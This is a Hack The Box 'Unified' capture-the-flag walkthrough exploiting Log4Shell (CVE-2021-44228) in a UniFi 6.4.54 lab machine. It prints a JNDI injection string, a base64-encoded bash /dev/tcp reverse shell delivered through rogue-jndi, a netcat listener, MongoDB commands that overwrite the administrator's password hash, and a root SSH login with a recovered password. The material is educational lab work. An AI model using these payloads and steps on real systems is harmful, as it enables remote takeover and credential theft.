#vulnerability-assessment #databases #custom-applications #mongodb #java #reconnaissance #clear-text-credentials #default-credentials #code-injection #log4j

# 0. Theory

**JNDI** is the acronym for the `Java Naming and Directory Interface API` . By making calls to this API, applications locate resources and other program objects. A resource is a program object that provides connections to systems, such as database servers and messaging systems.

**LDAP** is the acronym for `Lightweight Directory Access Protocol` , which is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over the Internet or a Network. The default port that LDAP runs on is `port 389`.

# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ ping 10.129.146.8 -c 4
	PING 10.129.146.8 (10.129.146.8) 56(84) bytes of data.
	64 bytes from 10.129.146.8: icmp_seq=1 ttl=63 time=8.33 ms
	64 bytes from 10.129.146.8: icmp_seq=2 ttl=63 time=8.13 ms
	64 bytes from 10.129.146.8: icmp_seq=3 ttl=63 time=8.29 ms
	64 bytes from 10.129.146.8: icmp_seq=4 ttl=63 time=8.32 ms
	
	--- 10.129.146.8 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 8.133/8.266/8.326/0.078 ms

# 2. Enumeration

We start off with the usual `nmap` scan, this time with the `-v` flag to increase verbosity level on the scan.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ nmap 10.129.146.8 -sV -sC -v
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 07:59 CDT
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	Initiating NSE at 07:59
	Completed NSE at 07:59, 0.00s elapsed
	Initiating NSE at 07:59
	Completed NSE at 07:59, 0.00s elapsed
	Initiating NSE at 07:59
	Completed NSE at 07:59, 0.00s elapsed
	Initiating Ping Scan at 07:59
	Scanning 10.129.146.8 [4 ports]
	Completed Ping Scan at 07:59, 0.02s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 07:59
	Completed Parallel DNS resolution of 1 host. at 07:59, 0.00s elapsed
	Initiating SYN Stealth Scan at 07:59
	Scanning 10.129.146.8 [1000 ports]
	Discovered open port 22/tcp on 10.129.146.8
	Discovered open port 8080/tcp on 10.129.146.8
	Discovered open port 6789/tcp on 10.129.146.8
	Discovered open port 8443/tcp on 10.129.146.8
	Completed SYN Stealth Scan at 07:59, 0.17s elapsed (1000 total ports)
	Initiating Service scan at 07:59
	Scanning 4 services on 10.129.146.8
	Completed Service scan at 08:02, 156.42s elapsed (4 services on 1 host)
	NSE: Script scanning 10.129.146.8.
	Initiating NSE at 08:02
	Completed NSE at 08:02, 14.29s elapsed
	Initiating NSE at 08:02
	Completed NSE at 08:02, 1.07s elapsed
	Initiating NSE at 08:02
	Completed NSE at 08:02, 0.00s elapsed
	Nmap scan report for 10.129.146.8
	Host is up (0.0091s latency).
	Not shown: 996 closed tcp ports (reset)
	PORT     STATE SERVICE         VERSION
	22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
	|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
	|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
	6789/tcp open  ibm-db2-admin?
	8080/tcp open  http-proxy
	|_http-title: Did not follow redirect to https://10.129.146.8:8443/manage
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-open-proxy: Proxy might be redirecting requests
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 
	|     Content-Type: text/html;charset=utf-8
	|     Content-Language: en
	|     Content-Length: 431
	|     Date: Sat, 19 Oct 2024 12:59:37 GMT
	|     Connection: close
	|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
	|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
	|     Found</h1></body></html>
	|   GetRequest, HTTPOptions: 
	|     HTTP/1.1 302 
	|     Location: http://localhost:8080/manage
	|     Content-Length: 0
	|     Date: Sat, 19 Oct 2024 12:59:37 GMT
	|     Connection: close
	|   RTSPRequest, Socks5: 
	|     HTTP/1.1 400 
	|     Content-Type: text/html;charset=utf-8
	|     Content-Language: en
	|     Content-Length: 435
	|     Date: Sat, 19 Oct 2024 12:59:37 GMT
	|     Connection: close
	|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
	|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
	|_    Request</h1></body></html>
	8443/tcp open  ssl/nagios-nsca Nagios NSCA
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	| http-title: UniFi Network
	|_Requested resource was /manage/account/login?redirect=%2Fmanage
	| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
	| Subject Alternative Name: DNS:UniFi
	| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2021-12-30T21:37:24
	| Not valid after:  2024-04-03T21:37:24
	| MD5:   e6be:8c03:5e12:6827:d1fe:612d:dc76:a919
	|_SHA-1: 111b:aa11:9cca:4401:7cec:6e03:dc45:5cfe:65f6:d829
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port8080-TCP:V=7.94SVN%I=7%D=10/19%Time=6713AD38%P=x86_64-pc-linux-gnu%
	SF:r(GetRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:
	SF:8080/manage\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2019\x20Oct\x2020
	SF:24\x2012:59:37\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,8
	SF:4,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\
	SF:nContent-Length:\x200\r\nDate:\x20Sat,\x2019\x20Oct\x202024\x2012:59:37
	SF:\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\
	SF:x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
	SF:age:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2019\x20Oct\x202
	SF:024\x2012:59:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
	SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x9
	SF:3\x20Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-fa
	SF:mily:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:whit
	SF:e;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-
	SF:size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x
	SF:20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;bord
	SF:er:none;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93
	SF:\x20Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1
	SF:\.1\x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-L
	SF:anguage:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Sat,\x2019\x20Oct\
	SF:x202024\x2012:59:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20
	SF:html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x8
	SF:0\x93\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-
	SF:family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:wh
	SF:ite;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{fon
	SF:t-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a
	SF:\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;bo
	SF:rder:none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x
	SF:93\x20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\
	SF:x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x2
	SF:0en\r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2019\x20Oct\x202024\x20
	SF:12:59:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\
	SF:x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Ba
	SF:d\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Ta
	SF:homa,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backg
	SF:round-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16
	SF:px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{colo
	SF:r:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none
	SF:;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
	SF:\x20Request</h1></body></html>");
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	NSE: Script Post-scanning.
	Initiating NSE at 08:02
	Completed NSE at 08:02, 0.00s elapsed
	Initiating NSE at 08:02
	Completed NSE at 08:02, 0.00s elapsed
	Initiating NSE at 08:02
	Completed NSE at 08:02, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 172.46 seconds
	           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.044KB)


The scan reveals `port 8080` open running an HTTP proxy. The proxy appears to redirect requests to `port 8443` , which seems to be running an SSL web server. We take note that the HTTP title of the page on port 8443 is "`UniFi Network`".

![[Pasted image 20241019150634.png]]

Upon accessing the page using a browser we are presented with the `UniFi` web portal login page and the version number is `6.4.54`.
If we ever come across a version number it’s always a great idea to research that particular version on Google. A quick Google search using the keywords `UniFy 6.4.54 exploit` reveals an [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) that discusses the in-depth exploitation of the [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) vulnerability within this application.

This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection), which is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running the application and typically fully compromise the application and all its data.

To determine if this is the case, we can use `FoxyProxy` after making a POST request to the `/api/login` endpoint, to pass on the request to BurpSuite, which will intercept it as a middle-man. The request can then be edited to inject commands.

First, we attempt to login to the page with the credentials `test:asdasd` as we aren’t trying to validate or gain access. The login request will be captured by BurpSuite and we will be able to modify it. Before we modify the request, let's send this HTTPS packet to the `Repeater` module of BurpSuite by pressing `CTRL+R`.

# 3. Foothold

The Exploitation section of the previously mentioned [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) mentions that we have to input our payload into the `remember` parameter. Because the POST data is being sent as a JSON object and because the payload contains brackets `{}`, in order to prevent it from being parsed as another JSON object we enclose it inside brackets `"` so that it is parsed as a string instead.

![[Pasted image 20241019152423.png]]

We input the payload into the remember field as shown above so that we can identify an injection point if one exists. If the request causes the server to connect back to us, then we have verified that the application is vulnerable.

![[Pasted image 20241019152452.png]]

After we hit "send" the "Response" pane will display the response from the request. The output shows us an error message stating that the payload is invalid, but despite the error message the payload is actually being executed.

Let's proceed to starting `tcpdump` on `port 389`, which will monitor the network traffic for LDAP connections.

> *`tcpdump` is a data-network packet analyzer computer program that runs under a command line interface. It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached.*

We open another terminal and type the following command:
`sudo tcpdump -i tun0 port 389`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ sudo tcpdump -i tun0 port 389
	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
	listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

Once `tcpdump` is started, we click on the Send button again in BurpSuite.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ sudo tcpdump -i tun0 port 389
	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
	listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
	08:27:32.510173 IP 10.129.146.8.43096 > htb-p1ru2f4g72.ldap: Flags [S], seq 3507262463, win 64240, options [mss 1340,sackOK,TS val 3735886506 ecr 0,nop,wscale 7], length 0
	08:27:32.510192 IP htb-p1ru2f4g72.ldap > 10.129.146.8.43096: Flags [R.], seq 0, ack 3507262464, win 0, length 0

We can verify the IP addresses to be exploited.

We will have to install `Open-JDK` and `Maven` on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system.

	sudo apt update
	sudo apt install openjdk-11-jdk -y
	# command used to check the java version installed
	java -version

Once installed, we check the java version to verify it.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ java -version
	openjdk version "17.0.11" 2024-04-16
	OpenJDK Runtime Environment (build 17.0.11+9-Debian-1deb12u1)
	OpenJDK 64-Bit Server VM (build 17.0.11+9-Debian-1deb12u1, mixed mode, sharing)


Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into `jar` files .

These applications will also help us run the `rogue-jndi` Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code.

Once we have installed Open-JDK, we can proceed to install Maven. But first, let’s switch to root user.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ sudo apt-get install maven
	Reading package lists... Done
	Building dependency tree... Done
	Reading state information... Done
	maven is already the newest version (3.8.7-1).
	The following packages were automatically installed and are no longer required:
	  espeak-ng-data geany-common libamd2 libbabl-0.1-0 libbrlapi0.8 libcamd2 libccolamd2
	  libcholmod3 libdotconf0 libept1.6.0 libespeak-ng1 libgegl-0.4-0 libgegl-common
	  libgimp2.0 libmetis5 libmng1 libmypaint-1.5-1 libmypaint-common libpcaudio0 libsonic0
	  libspeechd2 libtorrent-rasterbar2.0 libumfpack5 libwmf-0.2-7 libwpe-1.0-1
	  libwpebackend-fdo-1.0-1 libxapian30 node-clipboard node-prismjs python3-brlapi
	  python3-louis python3-pyatspi python3-speechd sound-icons
	  speech-dispatcher-audio-plugins xbrlapi xkbset
	Use 'sudo apt autoremove' to remove them.
	0 upgraded, 0 newly installed, 0 to remove and 212 not upgraded.

After the installation has completed, we can check the version of Maven.
`mvn -v`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ mvn -v
	Apache Maven 3.8.7
	Maven home: /usr/share/maven
	Java version: 17.0.11, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64
	Default locale: en_US, platform encoding: UTF-8
	OS name: "linux", version: "6.5.0-13parrot1-amd64", arch: "amd64", family: "unix"


Once we have installed the required packages, we now need to download and build the `Rogue-JNDI` Java application.

To clone the respective repository and build the package using Maven:

	git clone https://github.com/veracode-research/rogue-jndi
	cd rogue-jndi
	mvn package

Once the build completes successfully, it will create a `.jar` file in `rogue-jndi/target/` directory called `RogueJndi-1.1.jar`. Now we can construct our payload to pass into the `RogueJndi-1-1.jar` Java application

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.
`echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64`

`echo 'bash -c bash -i >&/dev/tcp/10.10.14.39/6565 0>&1' | base64`

The command above yields the base64 encoded form of the command we put into the `echo` command as parameter. This is to have the entire command's base64 encoded version in plain text, so that we can pass it as a parameter below.

> *Note: we chose `port 6565` here.*

	[*** SNIP ***]
	[INFO] Replacing /home/scrage/rogue-jndi/target/RogueJndi-1.1.jar with /home/scrage/rogue-jndi/target/RogueJndi-1.1-shaded.jar
	[INFO] Dependency-reduced POM written at: /home/scrage/rogue-jndi/dependency-reduced-pom.xml
	[INFO] ------------------------------------------------------------------------
	[INFO] BUILD SUCCESS
	[INFO] ------------------------------------------------------------------------
	[INFO] Total time:  7.018 s
	[INFO] Finished at: 2024-10-19T08:37:07-05:00
	[INFO] ------------------------------------------------------------------------
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~/rogue-jndi]
	└──╼ [★]$ echo 'bash -c bash -i >&/dev/tcp/10.10.14.39/6565 0>&1' | base64
	YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzkvNjU2NSAwPiYxCg==


After the payload has been created, we start the `Rogue-JNDI` application while passing in the payload as part of the `--command` option and our `tun0` IP address to the `--hostname` option.

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

In this example:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzkvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.39"
```

> ***Important:** Make sure to delete the spaces next to the pipes for the server command, otherwise the payload will not work and will not give a reverse shell!*

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~/rogue-jndi]
	└──╼ [★]$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzkvNjU2NSAwPiYxCg==}| {base64,-d}|{bash,-i}" --hostname "10.10.14.39"
	+-+-+-+-+-+-+-+-+-+
	|R|o|g|u|e|J|n|d|i|
	+-+-+-+-+-+-+-+-+-+
	Starting HTTP server on 0.0.0.0:8000
	Starting LDAP server on 0.0.0.0:1389
	Mapping ldap://10.10.14.39:1389/o=websphere1 to artsploit.controllers.WebSphere1
	Mapping ldap://10.10.14.39:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
	Mapping ldap://10.10.14.39:1389/o=tomcat to artsploit.controllers.Tomcat
	Mapping ldap://10.10.14.39:1389/o=groovy to artsploit.controllers.Groovy
	Mapping ldap://10.10.14.39:1389/ to artsploit.controllers.RemoteReference
	Mapping ldap://10.10.14.39:1389/o=reference to artsploit.controllers.RemoteReference
	Mapping ldap://10.10.14.39:1389/o=websphere2 to artsploit.controllers.WebSphere2
	Mapping ldap://10.10.14.39:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2

![[Pasted image 20241019163358.png]]
![[Pasted image 20241019163514.png]]

Now that the server is listening locally on `port 389`, let's open another terminal and start a Netcat listener to capture the reverse shell (on our chosen port `6565`).
`nc -lvp 6565`

Going back to our intercepted POST request, we change the payload to
`${jndi:ldap://{Your Tun0 IP}:{Port of Running RogueJndi}/o=tomcat}`
and click `Send`.

`"${jndi:ldap://10.10.14.39:1389/o=tomcat}",`

After sending the request, a connection to our rogue server is received and the following message is shown:

	Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload

Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can upgrade the terminal shell using the following command.
`script /dev/null -c bash`

The above command will turn our shell into an interactive shell that will allow us to interact with the system more effectively.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.39]─[scrage@htb-p1ru2f4g72]─[~]
	└──╼ [★]$ nc -nlvp 6565
	listening on [any] 6565 ...
	connect to [10.10.14.39] from (UNKNOWN) [10.129.146.8] 40598
	script /dev/null -c bash
	Script started, file is /dev/null
	unifi@unified:/usr/lib/unifi$ whoami
	whoami
	unifi
	unifi@unified:/usr/lib/unifi$ id
	id
	uid=999(unifi) gid=999(unifi) groups=999(unifi)

The user flag is in the `home/` directory.

	cd /home
	unifi@unified:/home$ ls
	ls
	michael
	unifi@unified:/home$ cd /home/michael
	cd /home/michael
	unifi@unified:/home/michael$ ls
	ls
	user.txt
	unifi@unified:/home/michael$ cat user.txt
	cat user.txt
	6ced1a6a89e666c0620cdb10262ba127

**User flag exfiltrated:** `6ced1a6a89e666c0620cdb10262ba127`

## Privilege Escalation

The article states we can get access to the administrator panel of the `UniFi` application and possibly extract SSH secrets used between the appliances. First let's check if MongoDB is running on the target system, which might make it possible for us to extract credentials in order to login to the administrative panel.

`ps aux | grep mongo`

	unifi@unified:/usr/lib/unifi$ ps aux | grep mongo
	ps aux | grep mongo
	unifi         67  0.3  4.2 1104776 85648 ?       Sl   12:43   0:03 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
	unifi        684  0.0  0.0  11468  1000 pts/0    S+   13:01   0:00 grep mongo

We can see MongoDB is indeed running on the target system, on `port 27117`.

We can use the mongo command line utility to interact with the MongoDB service in hopes of extracting the admin password.
A quick google search using the keywords `UniFi Default Database` shows that the default database name for the `UniFi` app is `ace`.

We can use the `db.admin.find()` function to enumerate users within the database.
`mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

	[*** SNIP ***]
	MongoDB shell version v3.6.3
	connecting to: mongodb://127.0.0.1:27117/ace
	MongoDB server version: 3.6.3
	{
		"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
		"name" : "administrator",
		"email" : "administrator@unified.htb",
		"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
		"time_created" : NumberLong(1640900495),
		"last_site_name" : "default",
		"ui_settings" : {
	[*** SNIP ***]

We can see the `x_shadow` property that belongs to the `administrator` with the value of `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.`
That is the password hash.

At this stage, we can go two ways about this finding:
- We either crack the admin user's password hash to gain admin access, or
- we simply change the hash with our very own created hash in order to replace the administrator password and authenticate to the admin panel on the website.

We opt for the second approach this time. To do so, we can use the `mkpasswd` command line utility.
The `$6$` is the identifier for the hashing algorithm that is being used for the original password, which is SHA-512 in this case. Therefore, we will have to make a hash of the same type.
`mkpasswd -m sha-512 Password1234`

>*SHA-512, or Secure Hash Algorithm 512, is a hashing algorithm used to convert text of any length into a fixed-size string. Each output produces a SHA-512 length of 512 bits (64 bytes). This algorithm is commonly used for email addresses hashing, password hashing...*

>*A salt is added to the hashing process to force their uniqueness, increase their complexity without increasing user requirements, and to mitigate password attacks like hash tables.*
>

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.59]─[scrage@htb-boyi9vhoy8]─[~]
	└──╼ [★]$ mkpasswd -m sha-512 Password1234
	$6$nrfCJY5/2237v4Fm$JefFpA0omSKI.4jq04h.I7mHB8.GuAw5ASmZSFTnyye27AI0sDQNkvPbquytWcE4Qg5nPrie1yCJBBiJifOfz1

Now we can replace the existing hash with the one we've just created, using the `db.admin.update` function.

`mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'`

	unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$nrfCJY5/2237v4Fm$JefFpA0omSKI.4jq04h.I7mHB8.GuAw5ASmZSFTnyye27AI0sDQNkvPbquytWcE4Qg5nPrie1yCJBBiJifOfz1"}})'
	<yye27AI0sDQNkvPbquytWcE4Qg5nPrie1yCJBBiJifOfz1"}})'
	MongoDB shell version v3.6.3
	connecting to: mongodb://127.0.0.1:27117/ace
	MongoDB server version: 3.6.3
	WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

It prompts us that 1 object in the database was modified. We can verify our change by running the previous command again to see the `administrator` user's `x_shadow` property value.

And now we can go back to the website and log in as `administrator` with our own password (username is case sensitive).

![[Pasted image 20241020142534.png]]

UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other Access Points over SSH from a console or terminal.
We navigate to `settings -> site` and scroll down to find the SSH Authentication setting. SSH authentication with a root password has been enabled.

![[Pasted image 20241020142759.png]]

The page shows the root password in plain text: `NotACrackablePassword4U2022`.
Let's attempt to authenticate to the system as root over SSH.
`ssh root@10.129.96.149`

Once the connection is successful, we can find the root user flag right in front of us.

	root@unified:~# ls
	root.txt
	root@unified:~# cat root.txt
	e50bc93c75b634e4b272d2f771c33681

**Root flag exfiltrated:** `e50bc93c75b634e4b272d2f771c33681`



https://www.hackthebox.com/achievement/machine/2057492/441
![[Pasted image 20241020144149.png]]